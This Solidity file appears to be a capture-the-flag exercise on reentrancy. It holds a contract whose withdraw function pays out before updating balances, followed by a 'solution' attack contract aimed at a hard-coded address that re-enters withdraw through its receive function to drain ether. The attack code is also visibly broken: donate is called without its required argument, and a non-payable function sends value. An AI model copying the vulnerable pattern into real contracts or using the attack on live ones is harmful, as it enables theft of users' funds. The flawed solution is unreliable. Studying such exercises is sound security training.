// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import './SafeMath.sol';

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}

// SOLUTION CONTRACT 

contract Attack {
    Reentrance public reentrance = Reentrance(0x8B40655fC8F7A0b7f151e4f38f1554d7c8a1b683);


    function attack(address _to) public {
      reentrance.donate{value: 1000 wei}();
      reentrance.withdraw(1000);
    }

    receive() external payable {
      reentrance.withdraw(1000);
    }

}